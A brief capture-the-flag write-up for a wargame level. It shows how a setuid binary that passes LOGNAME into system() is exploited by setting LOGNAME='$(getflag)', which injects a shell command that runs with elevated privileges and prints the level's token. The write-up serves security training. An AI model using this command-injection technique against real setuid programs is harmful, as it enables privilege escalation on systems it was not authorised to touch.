```sh
$> ls -l ~
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

$> ./level07
level07

$> strings level07
[...]
LOGNAME
/bin/echo %s
[...]

$> LOGNAME=test

$> ./level07
test
```

The code contains something like:
```c
system("/bin/echo %s", getenv("LOGNAME"));
```

Since `system()` will create a shell process, we can use `$LOGNAME` to execute a `/bin/getflag`

```sh
$> LOGNAME='$(getflag)'

$> ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
